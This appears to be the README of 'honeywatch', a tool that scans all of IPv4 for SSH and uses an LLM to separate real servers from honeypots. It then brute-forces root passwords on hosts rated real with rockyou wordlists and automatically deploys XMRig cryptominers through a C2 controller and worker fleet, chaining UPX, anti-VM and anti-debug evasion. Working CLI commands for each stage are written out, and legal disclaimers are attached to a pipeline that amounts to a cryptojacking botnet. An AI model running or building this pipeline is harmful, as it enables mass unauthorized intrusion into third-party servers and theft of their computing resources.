<img width="960" height="540" alt="Nightglass" src="https://github.com/user-attachments/assets/2bf9b50b-a7fa-4aa9-68446901dfa0" />

# Nightglass

**Nightglass** is the public front for **honeywatch** — a planet-scale SSH
honeypot scanner with AI confidence scoring, a C2 control plane, and an
authorized red-team payload-deployment toolkit. Everything below describes the
`honeywatch` package and CLI.

---

# honeywatch — planet-scale SSH honeypot scanner with AI confidence scoring, online SSH cracking, and a cryptojacking deployment + C2 pipeline

honeywatch scans large address spaces for open SSH (port 22) services, builds a
deep protocol fingerprint of every one, scores it with **deterministic heuristic
signals**, and then asks the **Ollama Cloud LLM** for a final confidence
verdict. The trick that makes AI feasible at planet scale: hosts with an
*identical fingerprint profile* are batched into a single prompt, so one LLM
call classifies millions of hosts instead of millions of calls.

Everything runs on the **Python 3.10+ standard library** — asyncio, sqlite3,
tomllib, urllib.request, argparse, hashlib, json, xml.etree. No numpy, no
pandas, no requests. Two *optional* extras make it stronger: `paramiko` (full
host-key probing) and `pytest` (tests). The scanners themselves (`masscan`,
`zmap`) and `nmap` are separate Linux binaries that honeywatch shells out to.

```
╔══════════════════════════════════════════════════════════════════════════╗
║                          honeywatch pipeline                             ║
╚══════════════════════════════════════════════════════════════════════════╝

  ┌───────────┐      ┌───────────┐
  │  masscan  │      │   zmap    │     network discovery (Linux-only tools)
  │ 0.0.0.0/0 │      │  target   │     optional — hand-picked targets work too
  └─────┬─────┘      └─────┬─────┘
        │                  │
        └─────── port 22 SYN ───────┘
                        │
                        ▼
              ┌─────────────────────┐
              │  hits: ip:22 open   │
              └──────────┬──────────┘
                         │   asyncio, concurrency=512, timeout_s=6
                         ▼
      ┌──────────────────────────────────────┐
      │   SSH fingerprint (per host)         │
      │   fast: banner · RFC4253 KEXINIT ·   │
      │         connect/banner timing        │
      │   full: + host-key type & SHA-256    │  (paramiko)
      └─────────────────┬────────────────────┘
                        │
                        ▼
      ┌──────────────────────────────────────┐
      │   rule-based Signals                 │
      │   heuristic score + anomalies/flags  │
      └─────────────────┬────────────────────┘
                        │  group by identical profile
                        ▼
      ┌──────────────────────────────────────┐
      │   ONE Ollama verdict per unique      │
      │   profile  →  AI confidence + label  │
      └─────────────────┬────────────────────┘
                        │
                        ▼
      ┌──────────────────────────────────────┐
      │   Score → SQLite + reports           │
      │   (JSON / CSV / Markdown)            │
      └─────────────────┬────────────────────┘
                        │  label=real/likely_real hosts
                        ▼
      ┌──────────────────────────────────────┐
      │   crack: SSH password guessing        │  (paramiko)
      │   wordlist + mutations · per-host     │
      │   concurrency · stops on first hit    │
      └─────────────────┬────────────────────┘
                        │  recovered creds → credentials table
                        ▼
      ┌──────────────────────────────────────┐
      │   deploy: payload manifests          │
      │   (auto-fills ssh_user/ssh_pass from  │
      │    the cracked credential store)     │
      └─────────────────┬────────────────────┘
                        │
                        ▼
      ┌──────────────────────────────────────┐
      │   C2 controller + worker fleet       │
      │   ssh exec (key or sshpass password)  │
      │   → fetch/build/run payload on target │
      └──────────────────────────────────────┘
```

## Overview

A honeypot is a service that *pretends* to be a real SSH server to observe
attackers. At internet scale, honeypots are cheap to deploy and plentiful —
which means any study of "which hosts are really running SSH" is polluted by
them. honeywatch is the instrument for telling the difference.

It works because **a real OpenSSH/sshd stack is a complex, specific protocol
implementation**, while most honeypots are thin scripts that emulate just
enough of the wire protocol to fool casual tools. The discrepancies are
measurable:

- **Depth of protocol.** A real server speaks RFC 4253: it sends a banner, then
  an `SSH_MSG_KEXINIT` with a rich, internally-consistent set of algorithms. A
  scripted honeypot often sends a pasted banner and no meaningful KEXINIT.
- **Timing.** Real handshakes take real CPU time and jitter. A stub that
  answers in microseconds is suspicious.
- **Identity.** Honeypot farms reuse the same host key and banner across
  thousands of IPs. Real fleets do not.
- **Consistency.** A banner that claims `OpenSSH_7.4` while offering only
  modern `ssh-ed25519` KEX is a red flag — banners are copy-pasted, algorithm
  lists come from the actual stack.

honeywatch packages those observations into heuristic signals, scores them, and
then lets an LLM make the final judgment call with a reason, so you get a
verdict you can audit — not just a number.

## How it works

1. **Discover.** Run `masscan` or `zmap` over your target range, or hand
   honeywatch a list of hosts directly. A "hit" is just `ip:22` reachable.
2. **Probe.** An asyncio pool (default 512 concurrent connections, 6 s timeout)
   talks to each open port. At `fast` level it captures the banner line, the
   RFC 4253 `SSH_MSG_KEXINIT` (kex / host-key / cipher / MAC / compression
   algorithms in both directions), and connect/banner timing. At `full` level
   (requires `paramiko`) it completes real key exchange to capture the host key
   type and SHA-256 fingerprint.
3. **Signal.** The rule engine turns each fingerprint into a set of anomalies,
   flags, evidence, and a heuristic score in `[0, 1]`.
4. **AI verdict.** Fingerprints are grouped by an **identity profile**
   (the normalized banner + algorithm set + host key). Each unique profile gets
   one LLM prompt; every host sharing that profile inherits the verdict. This
   is what makes planet-scale AI scoring practical.
5. **Persist.** Final scores (heuristic + AI) are written to SQLite and
   rendered to JSON / CSV / Markdown reports.

## Operating at planet scale

A `0.0.0.0/0` sweep is a multi-hour job that *will* be interrupted — a flaky
egress, a crashed shell, a laptop battery. honeywatch is built so an
interrupted scan is cheap to lose and cheap to recover:

- **Resumable scans.** `honeywatch scan ... --resume` reads the `(ip, port)`
  set already scored in the store and skips re-probing (and re-charging the LLM
  for) that work. Restart the same command and it picks up where it stopped.
- **Persistent honeypot-key learning.** Every host-key SHA-256 that a run
  classifies as a honeypot is written to a `known_keys` table. The next scan
  folds that set into the heuristic `known_hashes`, so a honeypot farm seen once
  is recognised forever — detection sharpens run over run instead of resetting
  each scan. Inspect the catalogue with `honeywatch stats`.
- **Store tuned for bulk writes.** SQLite runs in WAL mode with relaxed
  synchronous writes and indexed `final_label` / `final_confidence` /
  `profile_key` / `banner` / `software` columns, so reporting and target
  selection stay fast once the table holds millions of rows.
- **AI robustness.** The LLM stage retries transient failures with exponential
  backoff (`ai.retries`, `ai.retry_base_delay`) and chunks profiles at a
  configurable bound (`ai.batch_size`) so a single hung server or one oversized
  prompt can't sink a whole scan.
- **Live progress.** `--progress` prints a heartbeat every 1000 probes so you
  can tell a long sweep is actually moving.

```bash
honeywatch scan 0.0.0.0/0 --max-hosts 200000 --resume --progress
honeywatch stats                    # hosts by label, flags, learned keys
honeywatch stats --json             # machine-readable
```

## CLI quickstart

### Install

```bash
# from the repo root
python -m pip install -e .

# run from anywhere
honeywatch --version
honeywatch --help
```

The install pulls **zero** runtime dependencies. Optional extras, if you want
them:

```bash
pip install -e .[full]   # paramiko — enables --probe-level full (host key)
pip install -e .[dev]    # pytest — run the test suite
```

### Make the AI available

honeywatch uses **Ollama Cloud models only** — you need an API key:

```bash
export OLLAMA_API_KEY=ollama_...          # create one at https://ollama.com/settings/keys
export HONEYWATCH_MODEL=gpt-oss:20b       # optional; default is llama3.1:8b
export HONEYWATCH_AI_BASE=https://ollama.com/v1   # optional; this is the default
```

With no key the AI stage is skipped and scores fall back to pure heuristics
(a warning is printed). See [AI integration](#ai-integration) for the full
story.

### VPN requirement — Mullvad or it won't start

`honeywatch scan` and `honeywatch probe` **refuse to start unless your traffic
egresses through Mullvad**. The gate checks Mullvad's own endpoint
(`https://am.i.mullvad.net/json`, `mullvad_exit_ip`) and, as a fallback, for a
local Mullvad/WireGuard tunnel interface (`mullvad`, `wg-mullvad`, `wg0`).

```bash
mullvad connect             # or via the Mullvad app / WireGuard config
honeywatch scan 0.0.0.0/0
# "honeywatch: vpn gate OK (am.i.mullvad.net confirms a Mullvad exit IP)"
```

Without Mullvad the command exits with code 2 and a refusal message. For
controlled/offline testing only, the gate can be bypassed explicitly with
`--skip-vpn-check` or `HONEYWATCH_SKIP_VPN=1` (your call — at your own risk).
Tune it under `[vpn]` in `config.toml` (`required`, `provider`, `timeout_s`).

### SSH-only results

By default every host that did **not** speak SSH is discarded: unreachable,
refused, and anything that answered with a non-SSH banner (e.g. a web server
on port 22). Only hosts whose banner parsed as `SSH-` are probed, scored and
reported. Pass `--all-hosts` (or set `scan.only_ssh = false`) for a debug run
that keeps everything.

### Write a config

```bash
honeywatch config --write        # writes ./config.example.toml -> ./config.toml
```

`config.toml` is optional; honeywatch runs fine on built-in defaults. It is
picked up when present next to your working directory, or when
`HONEYWATCH_CONFIG=/path/to/config.toml` is set.

### Probe a single host

```bash
honeywatch probe 1.2.3.4                # fast fingerprint + heuristic + AI verdict
honeywatch probe 1.2.3.4 --probe-level full    # adds host-key SHA-256 (paramiko)
honeywatch probe 1.2.3.4 5.6.7.8 --no-ai      # many hosts, no LLM call
honeywatch probe 1.2.3.4 --timeout 10
```

### Scan a subnet

```bash
honeywatch scan 192.0.2.0/24                     # default tool, port 22, saved to SQLite
honeywatch scan 10.0.0.0/8 --tool masscan --ports 22,2222 --rate 1000
honeywatch scan 192.0.2.0/24 --tool zmap --rate 5000
honeywatch scan 192.0.2.0/24 --max-hosts 2000   # cap how many hits to fingerprint
honeywatch scan 192.0.2.0/24 --no-ai --report-format json,csv,md
```

Run `honeywatch <command> --help` for the exact flags of your installed version.

## Full-internet scan examples

The design goal is one pass over IPv4 space. That means using `masscan` at
rates far above what the built-in `probe` concurrency needs.

```bash
# discovery: entire IPv4 space, port 22 only
honeywatch scan 0.0.0.0/0 --tool masscan --ports 22 --rate 10000 --max-hosts 200000

# discovery: every host in a /8 you control
honeywatch scan 203.0.113.0/8 --tool masscan --ports 22 --rate 20000

# zmap variant (single-port by design; much lighter than masscan)
honeywatch scan 0.0.0.0/0 --tool zmap --rate 5000 --max-hosts 200000
```

### ⚠️ STRONG WARNING

Scanning networks you do not own, or that you are not **explicitly
authorized to test**, may be **illegal** — under the US Computer Fraud and
Abuse Act (CFAA), the UK Computer Misuse Act, the EU's NIS/cybercrime
frameworks, and equivalent national law worldwide — and it can get your IP
banned, your hosting account terminated, or worse. honeywatch ships with a
**conservative default rate** (`scanners.masscan.rate = 1000` packets/s) for
exactly this reason. Real internet-scale scanning from a data-center IP against
networks you don't own is how people get felony charges, not fun.

honeywatch is a **research and authorized-audit tool**. Point it at your own
network, your customers' networks (with a signed scope), honeypot/pentest labs,
and any address space where you hold written permission. `--max-hosts` lets you
bound how much of an external range you touch — prefer that to full
`0.0.0.0/0` sweeps unless you genuinely own or are paid to scan all of it.

Also note: `masscan` and `zmap` need **root** (raw sockets) and are
**Linux-only** (see [Troubleshooting](#troubleshooting)).

## AI integration

honeywatch uses Ollama's **OpenAI-compatible** `/v1/chat/completions` endpoint
against **Ollama Cloud only** — there is no local-server fallback.

- **Ollama Cloud** — `https://ollama.com/v1` (default `base_url`), authenticated
  with `OLLAMA_API_KEY` (create one at
  [ollama.com/settings/keys](https://ollama.com/settings/keys); see
  [`.env.example`](.env.example)). Model names like `llama3.1:8b` or anything
  the cloud serves.

Config (`[ai]` section of `config.toml`):

| Key             | Default                    | Meaning                                   |
|-----------------|----------------------------|-------------------------------------------|
| `enabled`       | `true`                     | run the LLM verdict stage at all          |
| `model`         | `llama3.1:8b`              | model tag on Ollama Cloud                 |
| `base_url`      | `https://ollama.com/v1`    | OpenAI-compatible chat endpoint (cloud)   |
| `api_key_env`   | `OLLAMA_API_KEY`           | env var holding the key (REQUIRED)        |
| `batch_profiles`| `true`                     | one prompt per identical profile          |
| `temperature`   | `0.0`                      | sampling temperature; 0.0 = deterministic |
| `timeout_s`     | `120`                      | LLM request timeout                       |

### The JSON contract

Each prompt asks the model to return a single JSON object with a fixed schema:

```json
{
  "classification": "real" | "honeypot" | "uncertain",
  "confidence": 0.0,
  "reasons": ["...", "..."]
}
```

`confidence` is 0.0–1.0. `classification` is one of the three allowed labels.
`reasons` are short, specific, human-readable justifications grounded in the
signals provided. Verdicts are parsed strictly; a malformed response is treated
as `uncertain` at 0.0 confidence so a bad LLM output never produces a false
high-confidence result.

### Why per-profile batching makes planet-scale AI feasible

A fingerprint has ~10 algorithm lists, a software string, a version, a host key
hash. But real servers cluster: OpenSSH 9.x on Ubuntu, dropbear on routers,
the same honeypot image on thousands of IPs. Two hosts with the **same profile**
are, to the classifier, the same *thing* — so it's correct and vastly cheaper
to ask about the profile, not the host:

- **1 LLM call per unique profile, not per host.** A honeypot farm of 10,000
  identical hosts costs one call.
- **LLM cost scales with distinct software identities**, which are small, not
  with address-space size, which is huge.
- **Labeling is stable**: the verdict for profile X is shared by all its
  members, so a 50k-host cluster gets a single auditable decision.
- Batches go through a **single cloud connection** with a generous 120 s
  timeout; `timeout_s` guards against a hung server.
- With `batch_profiles = false` you get one call per host (for lab
  experiments, or when hosts are all genuinely distinct).

## Heuristic signals

Before any AI, the rule engine scores every fingerprint from 0.0 to 1.0.
Higher = more likely to be a real SSH service. Each signal contributes
evidence; enough strong signals move the label toward `honeypot` even when the
LLM says nothing.

| Signal                    | What the probe saw                                          | Why it suggests honeypot                  |
|---------------------------|------------------------------------------------------------|--------------------------------------------|
| `no_banner`               | TCP accept, nothing sent before timeout                    | many stubs never emit a banner             |
| `immediate_banner`        | banner in < ~5 ms with no stack jitter                     | deterministic script, no real protocol    |
| `banner_version_mismatch` | banner software/version contradicts KEXINIT algorithm set  | banners are pasted; KEXINIT is real code  |
| `obsolete_algorithms`     | modern-sounding banner + only legacy kex/ciphers           | thin stacks implement few algorithms       |
| `no_kexinit`              | no `SSH_MSG_KEXINIT` after the banner                      | deeper protocol never arrives              |
| `kexinit_inconsistent`    | self-contradictory algorithm lists                         | hand-assembled packet data                 |
| `duplicate_host_key`      | same host-key SHA-256 across many IPs                      | shared key = classic honeypot farm         |
| `weak_host_key`           | DSA / 512-bit RSA / odd key type                          | canned test keys shipped with honeypot    |
| `banner_reuse`            | identical banner string across many IPs                    | copy-pasted banner farms                   |
| `host_key_reuse`          | known-bad host key hash (from `known_hashes` set)          | fingerprint matches a catalogued honeypot  |
| `misc_mismatch`           | port 22 running on a host whose behavior looks like a VM image |     probabilistic combination             |

Signals also include a **`flags`** list — special-interest marks the score
weights but that you may want to see in raw output (e.g.
`auth_probe_rejected`, `host_key_reuse`).

## Output & reports

Everything lands in a **SQLite** database (`storage.db`, default
`honeywatch.db`) — one row per scored host:

- `final_label`: `real` / `honeypot` / `uncertain`
- `final_confidence`: 0.0–1.0 blend of the heuristic score and the AI
  confidence
- the full `Fingerprint` (algorithms, host key, timing)
- the `Signals` (anomalies, flags, evidence) and the `AiVerdict` (label,
  confidence, reasons, raw text)

And you can render reports any time:

```bash
honeywatch report --format json --limit 200          # top 200 by confidence
honeywatch report --format csv --label honeypot
honeywatch report --format md  --min-confidence 0.9
```

| Format | Extension | Contents                              |
|--------|-----------|----------------------------------------|
| JSON   | `.json`   | full machine-readable score records    |
| CSV    | `.csv`    | flat table for spreadsheets            |
| Markdown| `.md`    | human-readable table for tickets/docs  |

Reports go to `storage.reports_dir` (default `reports/`). The store supports
`upsert_scores`, `query(limit, label, min_confidence)`, and `stats()`.

## Red-team operations

honeywatch also functions as a red-team operations platform. After discovery
and classification, you can deploy approved payloads onto verified hosts,
manage workers through a C2 web plane, and chain evasion tooling.

### Payload registry

Built-in payload categories (installable on authorized testing machines):

**Artifact integrity.** Payload install scripts fetch binaries over the
network and execute them — a blind `curl | tar | exec` is a supply-chain risk
(trojaned release, MITM). honeywatch closes this gap with an opt-in integrity
manifest: pin a `sha256` per payload and the rendered script runs
`sha256sum -c` against the download and aborts on mismatch. With
`--require-integrity` (or `payloads.require_integrity = true`) a payload with
no pinned hash is refused outright.

```bash
# write payloads/integrity.toml with the real sha256s of the releases you trust
#   xmrig = "<sha256 of the pinned v6.22.0 linux-x64 tarball>"
#   upx   = "<sha256 of the pinned v4.2.4 linux-amd64 tarball>"

honeywatch deploy xmrig --target-file targets.txt \
  --var pool=... --var wallet=... \
  --integrity payloads/integrity.toml --require-integrity
```

Without a pinned hash the script prints a loud **UNVERIFIED** warning but
proceeds; `--require-integrity` makes that fatal so you can never deploy an
unverified artifact by accident.

| Category | Payload IDs | Purpose |
|----------|-------------|---------|
| `miner` | `xmrig`, `xmrigcc`, `stratum` | Cryptocurrency miner deployment / stratum proxy |
| `exploit` | `metasploit` | Metasploit framework staging and resource scripts |
| `evasion` | `upx`, `packers`, `obfuscators`, `symbol_strip`, `anti_debug`, `anti_vm` | Binary packing, obfuscation, symbol stripping, anti-analysis |

Each payload is defined as metadata + install/run script templates. No malware is
bundled; the generated manifest tells a worker how to fetch or build the tool on
the target.

### Deploy a payload

```bash
# Dry-run a stratum-proxy deployment against a target file
honeywatch deploy stratum \
  --target-file targets.txt \
  --var upstream_pool=pool.example.com:3333 \
  --dry-run \
  --skip-vpn-check

# Enqueue an XMRig deployment against high-confidence "real" hosts
honeywatch deploy xmrig \
  --target-label real --min-confidence 0.9 \
  --var pool=stratum+tcp://pool.example.com:3333 \
  --var wallet=YOUR_WALLET \
  --var worker=honeywatch \
  --skip-vpn-check

# Chain evasion tooling
honeywatch deploy xmrig \
  --target-file targets.txt \
  --evasion upx,symbol_strip,anti_vm \
  --var pool=... --var wallet=... \
  --skip-vpn-check
```

Use `--controller-url http://controller:8443` to enqueue via the C2 API
instead of writing directly to the SQLite store.

### SSH password cracking

For initial access on hosts whose password policy you're authorized to test,
honeywatch ships an online SSH credential-guesser. It reuses the same optional
`paramiko` transport as the full fingerprint probe (no new hard dependency),
persists recovered credentials to a `credentials` table so they survive across
runs, and auto-feeds `deploy` — so the loop closes with no extra flags.

```bash
# Spray a wordlist + mutations (case, year, symbol suffixes) at one box
honeywatch crack 10.0.0.5 --wordlist rockyou.txt --user root --skip-vpn-check

# Crack every host the scanner labelled real, then deploy onto them — creds
# are picked up automatically from the store
honeywatch crack --target-label real --min-confidence 0.8 --skip-vpn-check
honeywatch deploy xmrig --target-label real --exec-mode ssh --skip-vpn-check

# List what you've recovered
honeywatch creds --json
```

The cracker uses one fresh transport per attempt (rate-limit-friendly), bounds
concurrency per host (default 8) and per fleet (default 32), stops a host on
the first hit by default, and never raises — every outcome lands in a
`CrackResult`. See `honeywatch crack --help` and [docs/crack.md](docs/crack.md).

### C2 controller / dashboard

Start the control plane:

```bash
# Optional: install aiohttp + websockets
pip install honeywatch[c2]

# Generate self-signed certs and start the dashboard
honeywatch c2 --generate-certs --skip-vpn-check

# Or provide your own TLS cert/key
honeywatch c2 --tls-cert certs/honeywatch.crt --tls-key certs/honeywatch.key

# Lock the control plane down with a shared bearer token (recommended for
# anything beyond localhost). When set, every API + WebSocket request must
# carry it; workers must be started with the matching --api-token.
honeywatch c2 --api-token s3cr3t --skip-vpn-check
```

The controller serves:

- Dashboard: `https://127.0.0.1:8443/` (WebSocket live updates)
- REST API: `/api/operations`, `/api/tasks`, `/api/tasks/claim`, `/api/workers`
- WebSocket: `/ws`

For production, front the controller with nginx + TLS. A sample config can be
generated through `honeywatch.c2.tls.render_nginx_config()`.

### Controller-to-worker plane

Workers pull tasks from the controller and execute them on target hosts. A
worker only receives tasks whose `category` is in its allowed list, so you can
tie workers to excluded payload categories / scoped networks.

```bash
# Start a worker that accepts miner tasks and runs in dry-run mode
honeywatch worker --categories miner --exec-mode dry_run

# Start a worker that deploys over SSH and authenticates to a token-gated controller
honeywatch worker \
  --categories miner,exploit \
  --exec-mode ssh \
  --ssh-user admin \
  --ssh-key /path/to/id_rsa \
  --api-token s3cr3t
```

Execution modes:

- `dry_run`: report the script without running it (default, safe for review)
- `local_simulate`: run the script on the worker host itself
- `ssh`: run the script on the target via `ssh`

### Operations flow

1. Scan / probe to populate the SQLite store.
2. Use `honeywatch deploy` to select targets and enqueue an operation.
3. Start `honeywatch c2`.
4. Start one or more `honeywatch worker` nodes.
5. Watch the dashboard as workers claim and execute tasks.

## Config reference

All defaults — set any subset in `config.toml`; the rest fall back to these.
Full annotated file: [`config.example.toml`](config.example.toml).

| Key                          | Default                        | Meaning                                    |
|------------------------------|--------------------------------|--------------------------------------------|
| `scanners.masscan.bin`       | `masscan`                      | masscan executable path/name               |
| `scanners.masscan.rate`      | `1000`                         | packets/sec (conservative default)         |
| `scanners.masscan.wait_s`    | `3`                            | seconds masscan waits for late SYN-ACKs (`--wait`); 0 under-counts |
| `scanners.masscan.timeout_s` | `null`                         | subprocess bound; set to guard against a hung scan |
| `scanners.masscan.exclude`   | `[]`                           | CIDRs skipped via `--exclude` (e.g. RFC1918 + your egress IP on a /0) |
| `scanners.zmap.bin`          | `zmap`                         | zmap executable path/name                  |
| `scanners.zmap.timeout_s`    | `null`                         | per-port subprocess bound                  |
| `scanners.nmap.bin`          | `nmap`                         | nmap executable path/name (optional)       |
| `probe.concurrency`          | `512`                          | max simultaneous async probes              |
| `probe.timeout_s`            | `6.0`                          | per-connection timeout                     |
| `probe.level`                | `"fast"`                       | `fast` (banner+KEXINIT+timing) / `full` (+host key) |
| `probe.auth_probe`           | `false`                        | one bogus SSH auth attempt (opt-in)        |
| `probe.progress`             | `false`                        | live heartbeat every 1000 probes (long scans) |
| `ai.enabled`                 | `true`                         | run the LLM verdict stage                  |
| `ai.model`                   | `"llama3.1:8b"`                | model tag on Ollama Cloud                 |
| `ai.base_url`                | `https://ollama.com/v1`        | Ollama Cloud OpenAI-compatible endpoint   |
| `ai.api_key_env`             | `"OLLAMA_API_KEY"`             | env var holding the API key (REQUIRED)    |
| `ai.batch_profiles`          | `true`                         | one LLM call per identical profile         |
| `ai.batch_size`              | `100`                          | max profiles per LLM call (prompt bound)  |
| `ai.temperature`             | `0.0`                          | sampling temperature                       |
| `ai.timeout_s`               | `120`                          | LLM request timeout                        |
| `ai.retries`                 | `3`                            | transient-failure retries w/ exp. backoff   |
| `ai.retry_base_delay`        | `1.0`                          | backoff base (seconds; doubles per attempt) |
| `scan.only_ssh`              | `true`                         | drop non-SSH hosts after probing            |
| `vpn.required`               | `true`                         | refuse to start unless Mullvad is on        |
| `vpn.provider`               | `"mullvad"`                    | tunnel provider required                    |
| `vpn.timeout_s`              | `8.0`                          | Mullvad connectivity-check timeout          |
| `storage.db`                 | `"honeywatch.db"`              | SQLite database path                       |
| `storage.reports_dir`        | `"reports"`                    | reports output directory                   |
| `payloads.enabled`           | `true`                         | enable red-team payload registry           |
| `payloads.allowed_categories`| `["miner","exploit","evasion"]`| categories deployable via CLI              |
| `payloads.default_evasion`   | `["upx","symbol_strip"]`       | evasion payloads chained by default        |
| `payloads.exec_mode`         | `"dry_run"`                    | default task execution mode                |
| `payloads.integrity_file`   | `null`                         | path to a `{payload_id: sha256}` manifest; install scripts verify downloads against it |
| `payloads.require_integrity`| `false`                        | refuse any payload that has no pinned hash (closes the blind-download gap) |
| `c2.enabled`                 | `false`                        | start C2 controller on demand                |
| `c2.host`                    | `"0.0.0.0"`                    | controller bind host                       |
| `c2.port`                    | `8443`                         | controller bind port                       |
| `c2.tls_cert`                | `null`                         | TLS certificate path                       |
| `c2.tls_key`                 | `null`                         | TLS private key path                       |
| `c2.api_token`               | `null`                         | shared bearer secret; when set, all API + WS requests require it |
| `workers.controller_url`     | `"http://127.0.0.1:8443"`      | worker controller endpoint                 |
| `workers.categories`         | `["miner","exploit","evasion"]`| categories this worker accepts             |
| `workers.poll_interval`      | `5.0`                          | seconds between task polls                 |
| `workers.exec_mode`          | `"dry_run"`                    | how the worker runs task scripts           |
| `workers.ssh_user`           | `"root"`                       | SSH user for ssh exec mode                 |
| `workers.ssh_key`            | `null`                         | SSH private key path                       |

Environment overrides: `HONEYWATCH_CONFIG`, `OLLAMA_API_KEY`, `HONEYWATCH_MODEL`,
`HONEYWATCH_AI_BASE`, `HONEYWATCH_SKIP_VPN` (skip the Mullvad gate).

## Architecture notes

- **Stdlib-only runtime.** `asyncio` drives all I/O; `tomllib` reads config;
  `sqlite3` is the store; `urllib.request` speaks OpenAI-style chat to Ollama;
  `subprocess` wraps masscan/zmap/nmap; `hashlib` does key SHA-256s;
  `xml.etree` can parse any server's RFC 4253/XML-ish framing if needed.
- **Async concurrency.** `probe_many` uses an `asyncio.Semaphore(concurrency)`
  so a /16 with 512 in flight never opens 65k sockets. Each probe has its own
  hard timeout (`probe.timeout_s`) — a hung host costs at most that many
  seconds and is skipped.
- **No credentials, ever.** Probing reads banners and KEXINITs, never
  authenticates. The single `auth_probe` opt-in sends one deliberately bogus
  authentication attempt and records only the server's rejection reply — it is
  off by default, sends no usable credential, and exists to flush the
  "no supported authentication methods" signature some honeypots answer.
- **Graceful degradation.** Missing `paramiko` downgrades `full` → `fast`;
  missing `nmap` skips the optional host probe; an unreachable LLM
  (`is_reachable()`) keeps the heuristic pipeline running and reports
  `uncertain` verdicts.
- **Deterministic AI.** `temperature = 0.0` + profile batching means the same
  profile gets the same verdict run-to-run, which matters when a cluster of
  10k hosts shares one identity.
- **Batch-aware scoring.** The profile-key is a stable hash of the fingerprint's
  semantic fields; hosts that are byte-identical in those fields share a key,
  and the verdict is cached in the run.
- **Optional C2 web plane.** `honeywatch[c2]` pulls `aiohttp` and `websockets`
  for the dashboard and worker transport. Without it, the core scanner still runs;
  `honeywatch c2` will prompt you to install the extras.
- **Worker isolation.** Workers claim tasks only from their allowed categories,
  keeping miner/exploit/evasion traffic separated by worker role and network
  scope.

## Troubleshooting

**"masscan: command not found" / "zmap: command not found"**
These are Linux-native tools. Install them:

```bash
sudo apt install masscan zmap        # Debian/Ubuntu
sudo dnf install masscan zmap        # Fedora
```

**Running on Windows / macOS**
`masscan` and `zmap` need raw sockets and Linux; on Windows run honeywatch
inside **WSL2**, or skip discovery (`honey probe` and `honeywatch scan` with a
small `--max-hosts` on a `nmap`-reachable target still work). `honeywatch probe`
itself is pure asyncio sockets and works anywhere Python does.

**Ollama Cloud not responding / scores are heuristic-only**
```bash
curl https://ollama.com/v1/models \
  -H "Authorization: Bearer $OLLAMA_API_KEY"   # sanity-check key + endpoint
```
Check that `OLLAMA_API_KEY` is set (create one at
https://ollama.com/settings/keys). If the LLM is unreachable, honeywatch prints
a warning and scores with the heuristic side only (`ai.enabled=false` also
works).

**Missing host key in `--probe-level full`**
You need `pip install paramiko`. Without it, `full` silently falls back to
`fast`.

**"Permission denied" / raw-socket errors from masscan/zmap**
Run them as root, or give them raw-packet capability — masscan/zmap need raw
packet access. Prefer `sudo` at the command line, or
`sudo setcap cap_net_raw+ep $(which masscan)` so they run unprivileged.

**I scanned and got a 100% `honeypot` run** — good. Feed the `known_hashes`
to `features.analyze()` to whitelist hosts you've verified; honeypot identity
reuse will shrink the set.

## Disclaimers and legal note

- **Scanning without authorization is a crime in most jurisdictions.**
  honeywatch does not make that safe; it only makes it *measurable*. Use it
  strictly on networks you own, or where you hold written authorization
  (pen-test contract, bug bounty scope, or as an internal security research
  box on your own lab).
- **Unlimited internet scanning is noise.** Respect
  [responsible disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure),
  rate-limit politely (the default rate is 1000 pps), and keep
  `--max-hosts` bounded when sweeping ranges you're not allowed to touch.
- **Honeypot detection is probabilistic.** Both the heuristic engine and the
  LLM return confidence, not truth. A "real" label means "consistent with a
  real SSH stack," and a "honeypot" label means "evidence strongly suggests a
  honeypot." Do not make your perimeter calls on a single scan.
- **No warranty.** honeywatch is provided as-is for security research and
  authorized testing.
- **Included tools.** `masscan`, `zmap`, `nmap`, and `paramiko` are their own
  projects with their own licenses; honeywatch only orchestrates them.
- **Reporting abuse.** If you find a genuinely misconfigured *real* service
  flagged as a honeypot, fix the config rather than ignoring the scan.

---

Happy hunting. And please — scan responsibly.
